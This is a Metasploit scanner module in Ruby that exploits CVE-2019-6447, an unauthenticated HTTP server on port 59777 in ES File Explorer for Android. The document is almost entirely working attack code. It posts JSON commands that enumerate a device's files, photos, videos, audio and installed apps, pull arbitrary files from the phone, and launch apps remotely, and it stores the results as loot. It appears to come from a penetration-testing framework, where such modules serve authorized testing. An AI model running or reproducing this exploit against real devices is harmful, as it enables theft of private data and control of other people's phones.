##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'ES File Explorer Open Port',
      'Description' => %q{
        This module connects to ES File Explorer's HTTP server to run
        certain commands. The HTTP server is started on app launch, and is available
        as long as the app is open. Version 4.1.9.7.4 and below are reported vulnerable
        This module has been tested against 4.1.9.5.1.
      },
      'References'  =>
        [
          ['CVE', '2019-6447'],
          ['URL', 'https://www.ms509.com/2016/03/01/es-explorer-vul/'],
          ['URL', 'https://github.com/fs0c131y/ESFileExplorerOpenPortVuln'],
          ['URL', 'https://twitter.com/fs0c131y/status/1085460755313508352'],
        ],
      'Author'      => [
          '小荷才露尖尖角', # discovery (2016)
          'moonbocal', # discovery (2019)
          'fs0c131y', # poc
          'h00die' # msf module
      ],
      'DisclosureDate' => 'Jan 16 2019',
      'License'     => MSF_LICENSE,
      'Actions' => [
        ['LISTFILES', {'Description' => 'List all the files on the sdcard'}],
        ['LISTPICS', {'Description' => 'List all the pictures'}],
        ['LISTVIDEOS', {'Description' => 'List all the videos'}],
        ['LISTAUDIOS', {'Description' => 'List all the audio files'}],
        ['LISTAPPS',   {'Description' => 'List all the apps installed'}],
        ['LISTAPPSSYSTEM', {'Description' => 'List all the system apps installed'}],
        ['LISTAPPSPHONE', {'Description' => 'List all the phone apps installed'}],
        ['LISTAPPSSDCARD', {'Description' => 'List all the apk files stored on the sdcard'}],
        ['LISTAPPSALL', {'Description' => 'List all the apps installed'}],
        ['GETDEVICEINFO', {'Description' => 'Get device info'}],
        ['GETFILE', {'Description' => 'Get a file from the device. ACTIONITEM required.'}],
        ['APPLAUNCH', {'Description' => 'Launch an app. ACTIONITEM required.'}],
      ],
      'DefaultAction' => 'GETDEVICEINFO',
    )

    register_options([
      Opt::RPORT(59777),
      OptString.new('ACTIONITEM', [false,'If an app or filename if required by the action']),
    ])

  end

  def sanitize_json(j)
    j.gsub!("},\r\n]", "}]")
    j.gsub!("'", '"')
    return j.gsub('", }', '"}')
  end

  def http_post(command)
    send_request_raw(
      'uri' => '/',
      'method' => 'POST',
      'data' => "{ \"command\":#{command} }",
      'ctype' => 'application/json',
    )
  end

  def run_host(target_host)
    case
      when action.name == 'LISTFILES'
        res = http_post('listFiles')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listFiles.json', 'application/json', target_host, res.body, 'es_file_explorer_listfiles.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['type']}: #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTPICS'
        res = http_post('listPics')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listPics.json', 'application/json', target_host, res.body, 'es_file_explorer_listpics.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTVIDEOS'
        res = http_post('listVideos')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listVideos.json', 'application/json', target_host, res.body, 'es_file_explorer_listvideos.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAUDIOS'
        res = http_post('listAudios')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listAudio.json', 'application/json', target_host, res.body, 'es_file_explorer_listaudio.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['name']} (#{f['size'].split(' (')[0]}) - #{f['time']}: #{f['location']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAPPS'
        res = http_post('listApps')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listApps.json', 'application/json', target_host, res.body, 'es_file_explorer_listapps.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAPPSSYSTEM'
        res = http_post('listAppsSystem')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listAppsSystem.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssystem.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAPPSPHONE'
        res = http_post('listAppsPhone')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listAppsPhone.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsphone.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAPPSSDCARD'
        res = http_post('listAppsSdcard')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listAppsSdcard.json', 'application/json', target_host, res.body, 'es_file_explorer_listappssdcard.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\n"
        end
        print_good(pretty_response)
      when action.name == 'LISTAPPSALL'
        res = http_post('listAppsAll')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('listAppsAll.json', 'application/json', target_host, res.body, 'es_file_explorer_listappsall.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        pretty_response = "#{peer}\n"
        json_resp.each do |f|
          pretty_response << "  #{f['label']} (#{f['packageName']}) Version: #{f['version']}\n"
        end
        print_good(pretty_response)
      when action.name == 'GETDEVICEINFO'
        res = http_post('getDeviceInfo')
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable or Bad Response")
          return
        end
        path = store_loot('getDeviceInfo.json', 'application/json', target_host, res.body, 'es_file_explorer_getdeviceinfo.json')
        vprint_good("#{peer}- Result saved to #{path}")
        json_resp = JSON.parse(sanitize_json(res.body))
        print_good("#{peer}- Name: #{json_resp['name']}")
      when action.name == 'GETFILE'
        unless datastore['ACTIONITEM'].start_with?('/')
          print_error('Action item is a path for GETFILE, like /system/app/Browser.apk')
        end
        res = send_request_raw(
          'uri' => datastore['ACTIONITEM'],
          'method' => 'GET',
          'ctype' => 'application/json',
        )
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.")
          return
        end
        path = store_loot('getFile', 'application/octet-stream', target_host, res.body, datastore['ACTIONITEM'])
        print_good("#{peer}- #{datastore['ACTIONITEM']} saved to #{path}")
      when action.name == 'APPLAUNCH'
        if datastore['ACTIONITEM'].empty?
          print_error('Action item is a path for GETFILE, like com.android.chrome')
        end
        res = send_request_raw(
          'uri' => '/',
          'method' => 'POST',
          'data' => "{ \"command\":appLaunch, \"appPackageName\":#{datastore['ACTIONITEM']} }",
          'ctype' => 'application/json',
        )
        unless res
          print_error("#{peer}- Error Connecting")
          return
        end
        unless res.code == 200
          print_error("#{peer}- Not Vulnerable, Bad Response.  File may not be available for download.")
          return
        end
        if res.body.include?('NameNotFoundException')
          print_error("#{peer}- Application #{datastore['ACTIONITEM']} not found on device")
          return
        elsif res.body.include?('{"result":"0"}')
          print_good("#{peer}- #{datastore['actionitem']} launched successfully")
        end
    end
  end
end
